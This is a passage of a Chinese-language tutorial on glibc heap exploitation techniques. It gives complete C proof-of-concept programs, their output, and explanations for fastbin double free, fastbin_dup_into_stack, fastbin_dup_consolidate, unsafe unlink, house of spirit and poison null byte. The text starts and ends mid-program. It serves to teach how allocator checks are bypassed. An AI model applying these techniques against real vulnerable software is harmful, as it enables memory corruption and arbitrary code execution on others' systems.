fprintf(stderr,\u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr,\u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr,\u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); fprintf(stderr,\u0026#34;Freeing the first one...\\n\u0026#34;); free(a); fprintf(stderr,\u0026#34;If we free %p again, things will crash because %p is at the top of the free list.\\n\u0026#34;, a, a); // free(a); fprintf(stderr,\u0026#34;So, instead, we\u0026#39;ll free %p.\\n\u0026#34;, b); free(b); fprintf(stderr,\u0026#34;Now, we can free %p again, since it\u0026#39;s not the head of the free list.\\n\u0026#34;, a); free(a); fprintf(stderr,\u0026#34;Now the free list has [%p, %p, %p]. If we malloc 3 times, we\u0026#39;ll get %p twice!\\n\u0026#34;, a, b, a, a); fprintf(stderr,\u0026#34;1st malloc(8): %p\\n\u0026#34;, malloc(8)); fprintf(stderr,\u0026#34;2nd malloc(8): %p\\n\u0026#34;, malloc(8)); fprintf(stderr,\u0026#34;3rd malloc(8): %p\\n\u0026#34;, malloc(8)); } 输出：\nThis file demonstrates a simple double-free attack with fastbins. Allocating 3 buffers. 1st malloc(8): 0x17e9010 2nd malloc(8): 0x17e9030 3rd malloc(8): 0x17e9050 Freeing the first one... If we free 0x17e9010 again, things will crash because 0x17e9010 is at the top of the free list. So, instead, we\u0026#39;ll free 0x17e9030. Now, we can free 0x17e9010 again, since it\u0026#39;s not the head of the free list. Now the free list has [0x17e9010, 0x17e9030, 0x17e9010]. If we malloc 3 times, we\u0026#39;ll get 0x17e9010 twice! 1st malloc(8): 0x17e9010 2nd malloc(8): 0x17e9030 3rd malloc(8): 0x17e9010 这里如果释放 a 后再释放它一次，由于它位于 freelist 顶端过不了安全检查，得到：\n*** Error in `./a.out\u0026#39;: double free or corruption (fasttop): 0x00000000007aa010 *** 这就是我们说的 double free。然而我们第一次释放 a 后如果先释放另一个块 b，那么 b 就会位于 freelist 顶部，此时再次释放 a 就可以绕过 double free 的检测。这样做的结果是最后第一次和第三次 malloc 得到的两个不同指针指向了相同的地址。\nfastbin_dup_into_stack # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file extends on fastbin_dup.c by tricking malloc into\\n\u0026#34; \u0026#34;returning a pointer to a controlled location (in this case, the stack).\\n\u0026#34;); unsigned long long stack_var; fprintf(stderr,\u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, 8+(char *)\u0026amp;stack_var); fprintf(stderr,\u0026#34;Allocating 3 buffers.\\n\u0026#34;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr,\u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr,\u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr,\u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); fprintf(stderr,\u0026#34;Freeing the first one...\\n\u0026#34;); free(a); fprintf(stderr,\u0026#34;If we free %p again, things will crash because %p is at the top of the free list.\\n\u0026#34;, a, a); // free(a); fprintf(stderr,\u0026#34;So, instead, we\u0026#39;ll free %p.\\n\u0026#34;, b); free(b); fprintf(stderr,\u0026#34;Now, we can free %p again, since it\u0026#39;s not the head of the free list.\\n\u0026#34;, a); free(a); fprintf(stderr,\u0026#34;Now the free list has [%p, %p, %p]. \u0026#34; \u0026#34;We\u0026#39;ll now carry out our attack by modifying data at %p.\\n\u0026#34;, a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr,\u0026#34;1st malloc(8): %p\\n\u0026#34;, d); fprintf(stderr,\u0026#34;2nd malloc(8): %p\\n\u0026#34;, malloc(8)); fprintf(stderr,\u0026#34;Now the free list has [%p].\\n\u0026#34;, a); fprintf(stderr,\u0026#34;Now, we have access to %p while it remains at the head of the free list.\\n\u0026#34; \u0026#34;so now we are writing a fake free size (in this case, 0x20) to the stack,\\n\u0026#34; \u0026#34;so that malloc will think there is a free chunk there and agree to\\n\u0026#34; \u0026#34;return a pointer to it.\\n\u0026#34;, a); stack_var = 0x20; fprintf(stderr,\u0026#34;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n\u0026#34;, a); *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d)); fprintf(stderr,\u0026#34;3rd malloc(8): %p, putting the stack address on the free list\\n\u0026#34;, malloc(8)); fprintf(stderr,\u0026#34;4th malloc(8): %p\\n\u0026#34;, malloc(8)); } 输出：\nThis file extends on fastbin_dup.c by tricking malloc into returning a pointer to a controlled location (in this case, the stack). The address we want malloc() to return is 0x7ffe1610b248. Allocating 3 buffers. 1st malloc(8): 0x1e3a010 2nd malloc(8): 0x1e3a030 3rd malloc(8): 0x1e3a050 Freeing the first one... If we free 0x1e3a010 again, things will crash because 0x1e3a010 is at the top of the free list. So, instead, we\u0026#39;ll free 0x1e3a030. Now, we can free 0x1e3a010 again, since it\u0026#39;s not the head of the free list. Now the free list has [0x1e3a010, 0x1e3a030, 0x1e3a010]. We\u0026#39;ll now carry out our attack by modifying data at 0x1e3a010. 1st malloc(8): 0x1e3a010 2nd malloc(8): 0x1e3a030 Now the free list has [0x1e3a010]. Now, we have access to 0x1e3a010 while it remains at the head of the free list. so now we are writing a fake free size (in this case, 0x20) to the stack, so that malloc will think there is a free chunk there and agree to return a pointer to it. Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right before the 0x20. 3rd malloc(8): 0x1e3a010, putting the stack address on the free list 4th malloc(8): 0x7ffe1610b248 这里利用上一个例子的 double free 漏洞，来让 malloc 返回一个任意地址（并不一定是栈上地址），从而实现任意地址读写。首先还是以 a-\u0026gt;b-\u0026gt;a 的顺序释放内存，随后两次 malloc 使得 d 指向原来 a 指向的地址 0x1e3a010，并且 freelist 里只剩一个 0x1e3a010。\n现在修改栈上变量 stack_var 的值为 0x20，这是为了伪造 chunk_size 头部让 malloc 以为这个地方有一个 chunk。这还不够，我们还需要让这个 chunk 被认为是空闲的，也就是要把它加入 freelist 中。\n怎么做呢？我们知道，对于一个空闲 chunk 来说，chunk_size 下面就是 fd，存放下一个空闲 chunk 的地址。而 malloc 返回给用户的指针 mem（在这个例子中，0x1e3a010）恰好指向 chunk_size 的结尾处，也就是 fd 开始位置。现在我们拥有 d 指针，也就能修改这个位置的值让它指向 stack_var 的前一个栈单元（这里是向前 8 字节），这里就是这个伪造 chunk 的 chunk 指针。这样一来，当我们进行 3rd malloc(8) 时，该 chunk 指针就会进入 freelist 里，最后 malloc 的时候就会返回这个伪造 chunk 的 mem 指针。\n注意栈从高地址向低地址生长，堆反过来，所以源码一开始是 8+(char *)\u0026amp;stack_var，而最后是 ((char*)\u0026amp;stack_var) - sizeof(d)。\nfastbin_dup_consolidate # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr,\u0026#34;Allocated two fastbins: p1=%p p2=%p\\n\u0026#34;, p1, p2); fprintf(stderr,\u0026#34;Now free p1!\\n\u0026#34;); free(p1); void* p3 = malloc(0x400); fprintf(stderr,\u0026#34;Allocated large bin to trigger malloc_consolidate(): p3=%p\\n\u0026#34;, p3); fprintf(stderr,\u0026#34;In malloc_consolidate(), p1 is moved to the unsorted bin.\\n\u0026#34;); free(p1); fprintf(stderr,\u0026#34;Trigger the double free vulnerability!\\n\u0026#34;); fprintf(stderr,\u0026#34;We can pass the check in malloc() since p1 is not fast top.\\n\u0026#34;); fprintf(stderr,\u0026#34;Now p1 is in unsorted bin and fast bin. So we\u0026#39;will get it twice: %p %p\\n\u0026#34;, malloc(0x40), malloc(0x40)); } 输出：\nAllocated two fastbins: p1=0x1af0010 p2=0x1af0060 Now free p1! Allocated large bin to trigger malloc_consolidate(): p3=0x1af00b0 In malloc_consolidate(), p1 is moved to the unsorted bin. Trigger the double free vulnerability! We can pass the check in malloc() since p1 is not fast top. Now p1 is in unsorted bin and fast bin. So we\u0026#39;will get it twice: 0x1af0010 0x1af0010 首先分配了两个 0x40 的 chunk，实际大小为 0x50。需要 p2 是为了之后释放 p1 时不会和 top chunk 合并。随后释放其中一个并申请 0x400 的 chunk，这时会尝试从 unsorted bin 中切割，但是空间不足，触发了 malloc_consolidate，使得 fastbin 中的 p1 进入 unsorted bin（实际上，如果此时有多个连续 chunk 在 fastbin 中，会先合并）中。\n这个时候，fastbin 链表头部没有 p1 了，所以我们再次 free(p1) 就可以成功，造成 double free。现在 fastbin 和 unsorted bin 中都有 p1 了，我们可以两次 malloc() 拿到两个同样的指针。\nunsafe_unlink # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; uint64_t *chunk0_ptr; int main() { fprintf(stderr,\u0026#34;Welcome to unsafe unlink 2.0!\\n\u0026#34;); fprintf(stderr,\u0026#34;Tested in Ubuntu 14.04/16.04 64bit.\\n\u0026#34;); fprintf(stderr,\u0026#34;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\u0026#34;); fprintf(stderr,\u0026#34;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\u0026#34;); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr,\u0026#34;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\u0026#34;); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr,\u0026#34;The global chunk0_ptr is at %p, pointing to %p\\n\u0026#34;, \u0026amp;chunk0_ptr, chunk0_ptr); fprintf(stderr,\u0026#34;The victim chunk we are going to corrupt is at %p\\n\\n\u0026#34;, chunk1_ptr); fprintf(stderr,\u0026#34;We create a fake chunk inside chunk0.\\n\u0026#34;); fprintf(stderr,\u0026#34;We setup the \u0026#39;next_free_chunk\u0026#39; (fd) of our fake chunk to point near to \u0026amp;chunk0_ptr so that P-\u0026gt;fd-\u0026gt;bk = P.\\n\u0026#34;); chunk0_ptr[2] = (uint64_t) \u0026amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr,\u0026#34;We setup the \u0026#39;previous_free_chunk\u0026#39; (bk) of our fake chunk to point near to \u0026amp;chunk0_ptr so that P-\u0026gt;bk-\u0026gt;fd = P.\\n\u0026#34;); fprintf(stderr,\u0026#34;With this setup we can pass this check: (P-\u0026gt;fd-\u0026gt;bk != P || P-\u0026gt;bk-\u0026gt;fd != P) == False\\n\u0026#34;); chunk0_ptr[3] = (uint64_t) \u0026amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr,\u0026#34;Fake chunk fd: %p\\n\u0026#34;,(void*) chunk0_ptr[2]); fprintf(stderr,\u0026#34;Fake chunk bk: %p\\n\\n\u0026#34;,(void*) chunk0_ptr[3]); fprintf(stderr,\u0026#34;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\u0026#34;); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr,\u0026#34;We shrink the size of chunk0 (saved as\u0026#39;previous_size\u0026#39;in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\u0026#34;); fprintf(stderr,\u0026#34;It\u0026#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\u0026#34;); chunk1_hdr[0] = malloc_size; fprintf(stderr,\u0026#34;If we had \u0026#39;normally\u0026#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\\n\u0026#34;,(void*)chunk1_hdr[0]); fprintf(stderr,\u0026#34;We mark our fake chunk as free by setting \u0026#39;previous_in_use\u0026#39; of chunk1 as False.\\n\\n\u0026#34;); chunk1_hdr[1] \u0026amp;= ~1; fprintf(stderr,\u0026#34;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\u0026#34;); fprintf(stderr,\u0026#34;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\u0026#34;); free(chunk1_ptr); fprintf(stderr,\u0026#34;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\u0026#34;); char victim_string[8]; strcpy(victim_string,\u0026#34;Hello!~\u0026#34;); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr,\u0026#34;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\u0026#34;); fprintf(stderr,\u0026#34;Original value: %s\\n\u0026#34;,victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr,\u0026#34;New Value: %s\\n\u0026#34;,victim_string); } 输出：\nWelcome to unsafe unlink 2.0! Tested in Ubuntu 14.04/16.04 64bit. This technique can be used when you have a pointer at a known location to a region you can call unlink on. The most common scenario is a vulnerable buffer that can be overflown and has a global pointer. The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write. The global chunk0_ptr is at 0x602070, pointing to 0x23ed010 The victim chunk we are going to corrupt is at 0x23ed0a0 We create a fake chunk inside chunk0. We setup the \u0026#39;next_free_chunk\u0026#39; (fd) of our fake chunk to point near to \u0026amp;chunk0_ptr so that P-\u0026gt;fd-\u0026gt;bk = P. We setup the \u0026#39;previous_free_chunk\u0026#39; (bk) of our fake chunk to point near to \u0026amp;chunk0_ptr so that P-\u0026gt;bk-\u0026gt;fd = P. With this setup we can pass this check: (P-\u0026gt;fd-\u0026gt;bk != P || P-\u0026gt;bk-\u0026gt;fd != P) == False Fake chunk fd: 0x602058 Fake chunk bk: 0x602060 We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata. We shrink the size of chunk0 (saved as\u0026#39;previous_size\u0026#39;in chunk1) so that free will think that chunk0 starts where we placed our fake chunk. It\u0026#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly If we had \u0026#39;normally\u0026#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80 We mark our fake chunk as free by setting \u0026#39;previous_in_use\u0026#39; of chunk1 as False. Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr. You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344 At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location. chunk0_ptr is now pointing where we want, we use it to overwrite our victim string. Original value: Hello!~ New Value: BBBBAAAA 利用 unlink 漏洞一般需要堆溢出以及全局指针变量。在这个例子里全局指针变量就是 chunk0 的 mem 指针，chunk0 中存在堆溢出，可以溢出到 chunk1。\n我们首先看一下 unlink 这个宏，它被用来从 bin 中删除 chunk：\n#define unlink(AV, P, BK, FD) { \\ FD = P-\u0026gt;fd; \\ BK = P-\u0026gt;bk; \\ if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0)) \\ malloc_printerr (check_action,\u0026#34;corrupted double-linked list\u0026#34;, P, AV); \\ else { \\ FD-\u0026gt;bk = BK; \\ BK-\u0026gt;fd = FD; \\ if (!in_smallbin_range (P-\u0026gt;size) \\ \u0026amp;\u0026amp; __builtin_expect (P-\u0026gt;fd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \u0026#34;corrupted double-linked list (not small)\u0026#34;, \\ P, AV); \\ if (FD-\u0026gt;fd_nextsize == NULL) { \\ if (P-\u0026gt;fd_nextsize == P) \\ FD-\u0026gt;fd_nextsize = FD-\u0026gt;bk_nextsize = FD; \\ else { \\ FD-\u0026gt;fd_nextsize = P-\u0026gt;fd_nextsize; \\ FD-\u0026gt;bk_nextsize = P-\u0026gt;bk_nextsize; \\ P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = FD; \\ P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = FD; \\ } \\ } else { \\ P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = P-\u0026gt;bk_nextsize; \\ P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = P-\u0026gt;fd_nextsize; \\ } \\ } \\ } \\ } 可以先忽略下面和 large bin 相关的部分，关注开头：首先要求满足两个条件：\n(P-\u0026gt;fd)-\u0026gt;bk == P (P-\u0026gt;bk)-\u0026gt;fd == P 如果满足，则执行：\n(P-\u0026gt;fd)-\u0026gt;bk = P-\u0026gt;bk (P-\u0026gt;bk)-\u0026gt;fd = P-\u0026gt;fd 这就是普通的双向链表删除结点的操作，不安全的地方在于上面的检查，我们可以伪造堆块来绕过这个检查。\n我们在 chunk0 里伪造 chunk。对于 chunk0_ptr，我们预留 0x10 空间给伪 chunk 的 prev_size 和 chunk_size 字段，此时 chunk0_ptr 就是 fake_chunk 的 chunk 指针。那么其 fd 实际上就是 *(chunk0_ptr + 2)，其 bk 实际上就是 *(chunk0_ptr + 3)。用 _0 后缀表示属于 chunk0 的字段，_f 表示属于伪造 chunk 的字段（从左至右、从下至上为低地址到高地址）：\n---------------------------- \u0026lt;- chunk1_ptr | prev_size_1 | chunk_size_1 | ---------------------------- | data | ---------------------------- | fd_f | bk_f | ---------------------------- | prev_size_f | chunk_size_f | ---------------------------- \u0026lt;- chunk0_ptr | prev_size_0 | chunk_size_0 | ---------------------------- 如果我们让伪造的 fd 指向 \u0026amp;chunk0_ptr - 0x18（0x8 一个单位，即三个单位），那么要找到 (fake_chunk-\u0026gt;fd)-\u0026gt;bk，就需要计算 (\u0026amp;chunk0_ptr - 0x18) + 0x18 = \u0026amp;chunk0_ptr，这就回到了 fake_chunk 的 chunk 指针上，满足了第一个条件。\n同理，让伪造的 bk 指向 \u0026amp;chunk0_ptr - 0x10，那么它的 fd 就需要把 0x10 加回来，同样回到了 fake_chunk 的 chunk 指针。这样就绕过了 unlink 的检查。\n现在，由于存在堆溢出，我们将 chunk1 的 prev_size 写成我们 fake_chunk 的大小。在例子里 chunk0 大小为 0x90，而 fake_chunk 为 0x80。然后把 chunk1 的 PREV_IN_USE 位置为 0，这样以后再 free(chunk1)，此时分配器就会认为前面有一个空闲的大小为 0x80 的 chunk，也就是我们的 fake chunk，然后触发 unlink(fake_chunk) 来尝试与 chunk1 合并。\n问题在于，我们从头到尾都没有真正释放过 fake chunk，因此它不可能出现在任何 bin 里，而 unlink 却尝试把它从 bin 里拆出来。这时执行链表删除操作，但由于 (P-\u0026gt;fd)-\u0026gt;bk 和 (P-\u0026gt;bk)-\u0026gt;fd 是相同的，只有后一句有意义，此时相当于执行了 chunk0_ptr = \u0026amp;chunk0_ptr - 0x18。\n------------------ | \u0026amp;chunk0_ptr-0x18 |--- ------------------ | | ? | | ------------------ | | ? | | ------------------ \u0026lt;--- | ? | ------------------ 那么同理，如果我们修改 *(chunk0_ptr + 3) 的值为 Hello!~，实际上就等于令 chunk0_ptr 指向 Hello!~，此时修改 *chunk0_ptr，那么 Hello!~ 字符串就被覆盖了。\nhouse_of_spirit # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file demonstrates the house of spirit attack.\\n\u0026#34;); fprintf(stderr,\u0026#34;Calling malloc() once so that it sets up its memory.\\n\u0026#34;); malloc(1); fprintf(stderr,\u0026#34;We will now overwrite a pointer to point to a fake \u0026#39;fastbin\u0026#39; region.\\n\u0026#34;); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr,\u0026#34;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n\u0026#34;, sizeof(fake_chunks), \u0026amp;fake_chunks[1], \u0026amp;fake_chunks[9]); fprintf(stderr,\u0026#34;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (\u0026lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\u0026#34;); fprintf(stderr,\u0026#34;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\u0026#34;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr,\u0026#34;The chunk.size of the *next* fake region has to be sane. That is\u0026gt; 2*SIZE_SZ (\u0026gt; 16 on x64) \u0026amp;\u0026amp; \u0026lt;av-\u0026gt;system_mem (\u0026lt;128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n\u0026#34;); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr,\u0026#34;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\u0026#34;, \u0026amp;fake_chunks[1]); fprintf(stderr,\u0026#34;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\u0026#34;); a = \u0026amp;fake_chunks[2]; fprintf(stderr,\u0026#34;Freeing the overwritten pointer.\\n\u0026#34;); free(a); fprintf(stderr,\u0026#34;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\u0026#34;, \u0026amp;fake_chunks[1], \u0026amp;fake_chunks[2]); fprintf(stderr,\u0026#34;malloc(0x30): %p\\n\u0026#34;, malloc(0x30)); } 输出：\nThis file demonstrates the house of spirit attack. Calling malloc() once so that it sets up its memory. We will now overwrite a pointer to point to a fake \u0026#39;fastbin\u0026#39; region. This region (memory of length: 80) contains two chunks. The first starts at 0x7ffcdc8eeb88 and the second at 0x7ffcdc8eebc8. This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (\u0026lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is \u0026gt; 2*SIZE_SZ (\u0026gt; 16 on x64) \u0026amp;\u0026amp; \u0026lt;av-\u0026gt;system_mem (\u0026lt;128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffcdc8eeb88. ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffcdc8eeb88, which will be 0x7ffcdc8eeb90! malloc(0x30): 0x7ffcdc8eeb90 这个比较简单，在 fake_chunks 数组里伪造了 fastbin 大小的 chunk，确保当前 chunk_size 和 nextsize 合法后，把 fake chunk 的 mem 指针地址给指针 a，然后 free(a)，这样就使得 fake chunk 进入了 fastbin，下次 malloc 就会返回这个 mem 指针。\n这里的合法是指：\nchunk_size 的 IS_MMAPED 为 0 chunk_size 属于 fastbin 范围内 nextsize 大于 2*SIZE_SZ，小于 system_mem poison_null_byte # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; int main() { fprintf(stderr,\u0026#34;Welcome to poison null byte 2.0!\\n\u0026#34;); fprintf(stderr,\u0026#34;Tested in Ubuntu 14.04 64bit.\\n\u0026#34;); fprintf(stderr,\u0026#34;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\\n\u0026#34;); fprintf(stderr,\u0026#34;This technique can be used when you have an off-by-one into a malloc\u0026#39;ed region with a null byte.\\n\u0026#34;); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr,\u0026#34;We allocate 0x100 bytes for \u0026#39;a\u0026#39;.\\n\u0026#34;); a = (uint8_t*) malloc(0x100); fprintf(stderr,\u0026#34;a: %p\\n\u0026#34;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr,\u0026#34;Since we want to overflow \u0026#39;a\u0026#39;, we need to know the \u0026#39;real\u0026#39; size of \u0026#39;a\u0026#39; \u0026#34; \u0026#34;(it may be more than 0x100 because of rounding): %#x\\n\u0026#34;, real_a_size); /* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0x200); fprintf(stderr,\u0026#34;b: %p\\n\u0026#34;, b); c = (uint8_t*) malloc(0x100); fprintf(stderr,\u0026#34;c: %p\\n\u0026#34;, c); barrier = malloc(0x100); fprintf(stderr,\u0026#34;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\\n\u0026#34; \u0026#34;The barrier is not strictly necessary, but makes things less confusing\\n\u0026#34;, barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr,\u0026#34;In newer versions of glibc we will need to have our updated size inside b itself to pass \u0026#34; \u0026#34;the check\u0026#39;chunksize(P) != prev_size (next_chunk(P))\u0026#39;\\n\u0026#34;); // we set this location to 0x200 since 0x200 == (0x211 \u0026amp; 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr,\u0026#34;b.size: %#lx\\n\u0026#34;, *b_size_ptr); fprintf(stderr,\u0026#34;b.size is: (0x200 + 0x10) | prev_in_use\\n\u0026#34;); fprintf(stderr,\u0026#34;We overflow \u0026#39;a\u0026#39; with a single null byte into the metadata of \u0026#39;b\u0026#39;\\n\u0026#34;); a[real_a_size] = 0; // \u0026lt;--- THIS IS THE\u0026#34;EXPLOITED BUG\u0026#34; fprintf(stderr,\u0026#34;b.size: %#lx\\n\u0026#34;, *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr,\u0026#34;c.prev_size is %#lx\\n\u0026#34;,*c_prev_size_ptr); // This malloc will result in a call to unlink on the chunk where b was. // The added check (commit id: 17f487b), if not properly handled as we did before, // will detect the heap corruption now. // The check is this: chunksize(P) != prev_size (next_chunk(P)) where // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow) // next_chunk(P) == b-0x10+0x200 == b+0x1f0 // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200 fprintf(stderr,\u0026#34;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n\u0026#34;, *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr,\u0026#34;b1: %p\\n\u0026#34;,b1); fprintf(stderr,\u0026#34;Now we malloc \u0026#39;b1\u0026#39;. It will be placed where \u0026#39;b\u0026#39; was. \u0026#34; \u0026#34;At this point c.prev_size should have been updated, but it was not: %#lx\\n\u0026#34;,*c_prev_size_ptr); fprintf(stderr,\u0026#34;Interestingly, the updated value of c.prev_size has been written 0x10 bytes \u0026#34; \u0026#34;before c.prev_size: %lx\\n\u0026#34;,*(((uint64_t*)c)-4)); fprintf(stderr,\u0026#34;We malloc \u0026#39;b2\u0026#39;, our \u0026#39;victim\u0026#39; chunk.\\n\u0026#34;); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr,\u0026#34;b2: %p\\n\u0026#34;,b2); memset(b2,\u0026#39;B\u0026#39;,0x80); fprintf(stderr,\u0026#34;Current b2 content:\\n%s\\n\u0026#34;,b2); fprintf(stderr,\u0026#34;Now we free \u0026#39;b1\u0026#39; and \u0026#39;c\u0026#39;: this will consolidate the chunks \u0026#39;b1\u0026#39; and \u0026#39;c\u0026#39; (forgetting about\u0026#39;b2\u0026#39;).\\n\u0026#34;); free(b1); free(c); fprintf(stderr,\u0026#34;Finally, we allocate \u0026#39;d\u0026#39;, overlapping \u0026#39;b2\u0026#39;.\\n\u0026#34;); d = malloc(0x300); fprintf(stderr,\u0026#34;d: %p\\n\u0026#34;,d); fprintf(stderr,\u0026#34;Now \u0026#39;d\u0026#39; and \u0026#39;b2\u0026#39; overlap.\\n\u0026#34;); memset(d,\u0026#39;D\u0026#39;,0x300); fprintf(stderr,\u0026#34;New b2 content:\\n%s\\n\u0026#34;,b2); fprintf(stderr,\u0026#34;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks\u0026#34; \u0026#34;for the clear explanation of this technique.\\n\u0026#34;); } 输出：\nWelcome to poison null byte 2.0! Tested in Ubuntu 14.04 64bit. This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions. This technique can be used when you have an off-by-one into a malloc\u0026#39;ed region with a null byte. We allocate 0x100 bytes for \u0026#39;a\u0026#39;. a: 0x19e6010 Since we want to overflow \u0026#39;a\u0026#39;, we need to know the 